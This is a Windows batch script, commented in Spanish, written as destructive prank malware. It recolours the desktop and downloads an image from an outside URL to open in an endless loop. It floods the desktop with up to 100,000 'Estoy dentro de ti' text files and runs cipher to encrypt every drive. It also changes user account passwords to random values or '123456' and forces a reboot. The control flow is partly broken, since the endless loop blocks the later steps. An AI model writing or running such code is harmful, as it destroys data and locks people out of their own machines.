@echo off
setlocal enabledelayedexpansion

:: Cambiar el fondo del escritorio a rojo
reg add "HKCU\Control Panel\Colors" /v Background /t REG_SZ /d "255 0 0" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

:: Establecer la ruta de la imagen en el escritorio
set desktop=%USERPROFILE%\Desktop
set image_path=%desktop%\enigma_digital.png

:: Descargar la imagen al escritorio
powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://files.oaiusercontent.com/file-2yVNkaqMgXq3yzG3McqTDGH4', '%image_path%')"

:: Abrir la imagen infinitamente cada medio segundo
:start_image_loop
start "" "%image_path%"
timeout /t 0.5 >nul
goto start_image_loop

:: Función para generar una contraseña aleatoria de 6 caracteres
:generate_password
setlocal
set password=
set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
for /L %%i in (1,1,6) do (
    set /A index=!random! %% 62
    for %%j in (!index!) do set "password=!password!!chars:~%%j,1!"
)
endlocal & set "password=%password%"

:: Función para generar un nombre de usuario aleatorio de 6 caracteres
:generate_username
set username=
for /L %%n in (1,1,6) do (
    set /A "index=!random! %% 36"
    for /F %%c in ('powershell -command "[char[]]([char]97..[char]122 + [char]48..[char]57)[!index!]"') do (
        set username=!username!%%c
    )
)

:: Crear archivos de bloc de notas hasta que no haya espacio
set counter=0
:loop_notepad
set desktop=%USERPROFILE%\Desktop
if %counter% lss 100000 (
    set /A counter+=1
    echo Estoy dentro de ti > "%desktop%\estoy dentro de ti %counter%.txt"
    goto loop_notepad
)

:: Cifrar todos los archivos en todas las unidades
:encrypt_files
for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        cipher /E /S:%%d:\
    )
)

:: Crear usuarios con contraseña aleatoria para todos los usuarios
for /F "skip=4 tokens=1,2*" %%A in ('net user') do (
    if "%%B" neq "Administrator" (
        call :generate_password
        net user %%B !password! /add
        net user %%B 123456
    )
)

:: Reiniciar el sistema
shutdown /r /t 0

:: Fin del script
endlocal
exit /b 0
